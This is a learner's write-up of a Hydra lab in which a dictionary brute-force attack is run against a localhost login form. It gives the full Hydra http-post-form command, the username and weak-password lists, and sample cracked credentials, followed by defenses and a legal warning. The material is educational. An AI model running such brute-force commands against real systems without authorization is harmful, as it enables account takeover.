# Hydra Password Cracking Lab

This document summarizes my hands-on learning from the Hydra password cracking lab, focusing on understanding password vulnerabilities and ethical penetration testing techniques.

**Lab Focus:** Simulating brute-force attacks to understand password security weaknesses.

**Difficulty:** Intermediate | **Completion Rate:** 60% | **Rating:** 99% positive

---

## Lab Overview

### Objectives
- Understand password vulnerability mechanisms
- Learn to configure and use Hydra for password testing
- Simulate brute-force and dictionary attacks
- Analyze attack results and evaluate security measures
- Recognize the importance of strong password policies

---

## Part 1: Exploring the Target Website

### Manual Login Testing

**Target:** Web interface on port 8080 with basic login form

**Test Attempts:**
```
Username: test     | Password: password123  → Failed
Username: admin    | Password: admin        → Failed
```

**Observations:**
- Generic error message: "Invalid username or password"
- No account lockout mechanism
- No CAPTCHA or rate limiting
- Unlimited login attempts allowed

**Key Insight:** This is security through obscurity - the system doesn't reveal whether username or password is wrong, but lack of protections makes it vulnerable to automated attacks.

---

## Part 2: Examining the Password List

### Understanding Dictionary Attacks

**Command:**
```bash
head -n 10 500-worst-passwords.txt
```

**Common Weak Passwords:**
```
123456
password
12345678
1234
12345
dragon
qwerty
567sjej
mustang
letmein
```

**Analysis:**
- Numeric sequences (123456, 12345678)
- Common words (password, dragon, mustang)
- Keyboard patterns (qwerty)
- Simple phrases (letmein)

**Dictionary Attack vs Brute-Force:**
- Dictionary: Uses pre-compiled lists of common passwords → faster
- Brute-Force: Tries every possible combination → extremely slow

---

## Part 3: Setting Up Hydra

### Creating Username List

```bash
cd ~/project
echo -e "admin\nuser\nroot" > ~/project/usernames.txt
cat ~/project/usernames.txt
```

**Output:**
```
admin
user
root
```

### Installing Hydra (Pro Users)

```bash
sudo apt-get update
sudo apt-get install hydra -y
```

### Verify Installation

```bash
hydra -h
```

---

## Part 4: Executing the Attack

### Hydra Attack Command

```bash
hydra -L ~/project/usernames.txt \
      -P ~/project/500-worst-passwords.txt \
      localhost \
      -s 8080 \
      http-post-form "/:username=^USER^&password=^PASS^:Invalid username or password" \
      -o ~/project/hydra_results.txt
```

### Command Breakdown

| Parameter | Description |
|-----------|-------------|
| `-L` | Username list file |
| `-P` | Password list file |
| `localhost` | Target host |
| `-s 8080` | Target port |
| `http-post-form` | Attack protocol |
| `/:username=^USER^&password=^PASS^` | Form parameters |
| `:Invalid username or password` | Failure detection string |
| `-o` | Output file |

### How It Works

1. Hydra replaces `^USER^` with usernames from list
2. Replaces `^PASS^` with passwords from list
3. Tries all combinations systematically
4. Identifies success by absence of failure string
5. Saves valid credentials to output file

**Total Attempts:** 3 users × 500 passwords = 1,500 attempts

---

## Attack Results

### Reading Results

```bash
cat ~/project/hydra_results.txt
```

**Example Output:**
```
[8080][http-post-form] host: localhost   login: admin   password: password123
```

---

## Security Implications

### Why This Attack Works

**Vulnerabilities:**
- No rate limiting
- No account lockout
- Weak passwords
- No CAPTCHA
- No IP blocking

### Real-World Protections

**Defense Mechanisms:**

1. **Account Lockout Policies**
   - Lock after N failed attempts
   - Temporary lockouts (15-30 min)

2. **Rate Limiting**
   - Limit attempts per IP
   - Throttle authentication requests

3. **Strong Password Policies**
   - 12+ character minimum
   - Complexity requirements
   - No dictionary words

4. **Multi-Factor Authentication (MFA)**
   - SMS/Email codes
   - Authenticator apps
   - Hardware keys

5. **Monitoring**
   - Failed login tracking
   - Anomaly detection
   - SIEM integration

6. **Additional Layers**
   - CAPTCHA implementation
   - IP reputation checking
   - WAF deployment

---

## Key Takeaways

### Skills Acquired

✅ Hydra configuration and usage  
✅ Dictionary attack methodology  
✅ HTTP POST form attack syntax  
✅ Password vulnerability analysis  
✅ Security defense mechanisms  

### Password Security Best Practices

**For Users:**
- Use 12+ character passwords
- Combine uppercase, lowercase, numbers, symbols
- Avoid dictionary words
- Use unique passwords per account
- Enable MFA
- Use password managers

**For Administrators:**
- Implement account lockout
- Add rate limiting and CAPTCHA
- Enforce strong password policies
- Monitor authentication attempts
- Implement MFA
- Use secure hashing (bcrypt, Argon2)

---

## Ethical Considerations

### ⚠️ Legal Warning

**Only test systems you own or have explicit written permission to test.**

Unauthorized access is illegal under:
- Computer Fraud and Abuse Act (CFAA)
- Computer Misuse Act
- Similar laws worldwide

**Legitimate Use Cases:**
- Authorized penetration testing
- Security audits
- Personal lab environments
- Security research with permission

---
